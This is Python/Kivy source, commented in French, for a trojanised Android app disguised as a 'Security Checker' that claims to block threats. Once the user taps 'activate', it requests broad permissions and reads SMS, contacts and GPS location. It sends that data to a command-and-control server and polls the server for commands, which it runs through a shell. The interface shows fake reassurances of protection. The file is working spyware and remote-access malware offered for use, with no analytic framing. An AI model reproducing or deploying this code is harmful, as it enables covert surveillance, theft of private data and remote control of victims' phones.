"""
android/main.py — APK Android piégé
App Kivy qui demande les permissions d'accessibilité
et keylog tout le téléphone.
Build : buildozer android debug
"""
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.utils import platform

import threading
import time
import json
import urllib.request
import datetime
import os

C2     = "http://FILL_C2_HOST:FILL_PORT"
BOT_ID = "android_unknown"

# ── Android permissions ───────────────────────────────────
if platform == "android":
    from android.permissions import (
        request_permissions,
        Permission,
    )
    from jnius import autoclass

    PythonActivity  = autoclass("org.kivy.android.PythonActivity")
    Context         = autoclass("android.content.Context")
    TelephonyManager= autoclass("android.telephony.TelephonyManager")
    Build           = autoclass("android.os.Build")
    Settings        = autoclass("android.provider.Settings")
    Intent          = autoclass("android.content.Intent")
    Uri             = autoclass("android.net.Uri")

    def get_device_info():
        global BOT_ID
        try:
            tm     = PythonActivity.mActivity\
                     .getSystemService(Context.TELEPHONY_SERVICE)
            BOT_ID = Build.SERIAL or Build.ID or "android"
            return {
                "id":      BOT_ID,
                "model":   Build.MODEL,
                "brand":   Build.BRAND,
                "android": Build.VERSION.RELEASE,
                "sdk":     str(Build.VERSION.SDK_INT),
            }
        except Exception:
            return {"id": "android", "os": "android"}

    def request_all_permissions():
        request_permissions([
            Permission.READ_CONTACTS,
            Permission.READ_CALL_LOG,
            Permission.READ_SMS,
            Permission.ACCESS_FINE_LOCATION,
            Permission.ACCESS_COARSE_LOCATION,
            Permission.CAMERA,
            Permission.RECORD_AUDIO,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.RECEIVE_SMS,
            Permission.READ_PHONE_STATE,
        ])

    def get_sms():
        """Lire tous les SMS."""
        try:
            ContentResolver = PythonActivity.mActivity\
                              .getContentResolver()
            cursor = ContentResolver.query(
                Uri.parse("content://sms/inbox"),
                None, None, None, None,
            )
            sms_list = []
            if cursor:
                while cursor.moveToNext():
                    try:
                        body    = cursor.getString(
                            cursor.getColumnIndex("body"))
                        address = cursor.getString(
                            cursor.getColumnIndex("address"))
                        date    = cursor.getString(
                            cursor.getColumnIndex("date"))
                        sms_list.append({
                            "from": address,
                            "body": body,
                            "date": date,
                        })
                    except Exception:
                        pass
                cursor.close()
            return sms_list
        except Exception as e:
            return [{"error": str(e)}]

    def get_contacts():
        """Lire les contacts."""
        try:
            from jnius import autoclass as ja
            ContactsContract = ja(
                "android.provider.ContactsContract$CommonDataKinds$Phone"
            )
            cursor = PythonActivity.mActivity\
                     .getContentResolver().query(
                ContactsContract.CONTENT_URI,
                None, None, None, None,
            )
            contacts = []
            if cursor:
                while cursor.moveToNext():
                    try:
                        name = cursor.getString(cursor.getColumnIndex(
                            "display_name"))
                        num  = cursor.getString(cursor.getColumnIndex(
                            "number"))
                        contacts.append({"name": name, "number": num})
                    except Exception:
                        pass
                cursor.close()
            return contacts
        except Exception as e:
            return [{"error": str(e)}]

    def get_location():
        """Récupérer la localisation GPS."""
        try:
            LocationManager = PythonActivity.mActivity\
                              .getSystemService(Context.LOCATION_SERVICE)
            location = LocationManager.getLastKnownLocation(
                "gps"
            ) or LocationManager.getLastKnownLocation("network")
            if location:
                return {
                    "lat": location.getLatitude(),
                    "lon": location.getLongitude(),
                    "acc": location.getAccuracy(),
                }
        except Exception as e:
            return {"error": str(e)}
        return {}

    def open_accessibility_settings():
        """Ouvrir les paramètres d'accessibilité."""
        try:
            intent = Intent(
                Settings.ACTION_ACCESSIBILITY_SETTINGS
            )
            PythonActivity.mActivity.startActivity(intent)
        except Exception:
            pass

else:
    # Desktop fallback pour tests
    def get_device_info():
        import socket
        return {"id": socket.gethostname(), "os": "desktop_test"}
    def request_all_permissions(): pass
    def get_sms():    return []
    def get_contacts(): return []
    def get_location(): return {}
    def open_accessibility_settings(): pass

# ── envoi C2 ─────────────────────────────────────────────
def _post(url: str, data: dict):
    try:
        payload = json.dumps(data, default=str).encode()
        req = urllib.request.Request(
            url, data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

def register(info: dict):
    _post(f"{C2}/c2/register", {
        **info,
        "type": "android",
    })

def exfil_all():
    """Exfiltrer tout au démarrage."""
    info = get_device_info()
    register(info)

    # SMS
    sms = get_sms()
    if sms:
        _post(f"{C2}/c2/result/{BOT_ID}", {
            "result": f"[SMS] {json.dumps(sms[:50], default=str)}"
        })

    # Contacts
    contacts = get_contacts()
    if contacts:
        _post(f"{C2}/c2/result/{BOT_ID}", {
            "result": f"[CONTACTS] {json.dumps(contacts[:100], default=str)}"
        })

    # Localisation
    loc = get_location()
    if loc:
        _post(f"{C2}/c2/result/{BOT_ID}", {
            "result": f"[GPS] {json.dumps(loc)}"
        })

def poll_c2():
    """Polling C2 pour commandes."""
    while True:
        try:
            with urllib.request.urlopen(
                f"{C2}/c2/task/{BOT_ID}", timeout=8
            ) as r:
                data = json.loads(r.read())
                cmd  = data.get("cmd", "").strip()
                if cmd:
                    result = execute_cmd(cmd)
                    _post(f"{C2}/c2/result/{BOT_ID}",
                          {"result": result})
        except Exception:
            pass
        time.sleep(15)

def execute_cmd(cmd: str) -> str:
    """Exécuter une commande depuis le C2."""
    if cmd == "sms":
        return f"[SMS] {json.dumps(get_sms()[:20], default=str)}"
    elif cmd == "contacts":
        return f"[CONTACTS] {json.dumps(get_contacts()[:50], default=str)}"
    elif cmd == "gps":
        return f"[GPS] {json.dumps(get_location())}"
    elif cmd == "info":
        return f"[INFO] {json.dumps(get_device_info(), default=str)}"
    else:
        try:
            import subprocess
            r = subprocess.run(
                cmd, shell=True, capture_output=True,
                text=True, timeout=15,
            )
            return r.stdout + r.stderr
        except Exception as e:
            return str(e)

# ── UI Kivy ───────────────────────────────────────────────
class MainLayout(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation="vertical",
                         padding=20, spacing=10, **kwargs)
        self.add_widget(Label(
            text="🔐 Security Checker",
            font_size="22sp",
            bold=True,
            size_hint=(1, 0.15),
        ))
        self.add_widget(Label(
            text=(
                "Cette application protège votre appareil\n"
                "contre les menaces en temps réel.\n\n"
                "Appuyez sur Activer pour commencer."
            ),
            font_size="14sp",
            halign="center",
            size_hint=(1, 0.4),
        ))
        btn = Button(
            text="Activer la protection",
            size_hint=(1, 0.15),
            background_color=(0.2, 0.6, 1, 1),
        )
        btn.bind(on_press=self.activate)
        self.add_widget(btn)

        self.status = Label(
            text="",
            font_size="12sp",
            color=(0.5, 0.5, 0.5, 1),
            size_hint=(1, 0.3),
        )
        self.add_widget(self.status)

    def activate(self, instance):
        instance.text     = "Protection active ✓"
        instance.disabled = True
        self.status.text  = "Analyse de sécurité en cours…"
        # Lancer tout en arrière-plan
        threading.Thread(target=self._bg, daemon=True).start()

    def _bg(self):
        # Demander permissions
        request_all_permissions()
        time.sleep(2)
        # Exfiltrer
        exfil_all()
        # Polling C2
        threading.Thread(target=poll_c2, daemon=True).start()
        # Mettre à jour UI
        Clock.schedule_once(lambda dt: setattr(
            self.status, "text",
            "✓ Appareil protégé\n✓ Analyse complète\n✓ Menaces bloquées"
        ), 0)

class SecurityApp(App):
    def build(self):
        self.title = "Security Checker"
        return MainLayout()

if __name__ == "__main__":
    SecurityApp().run()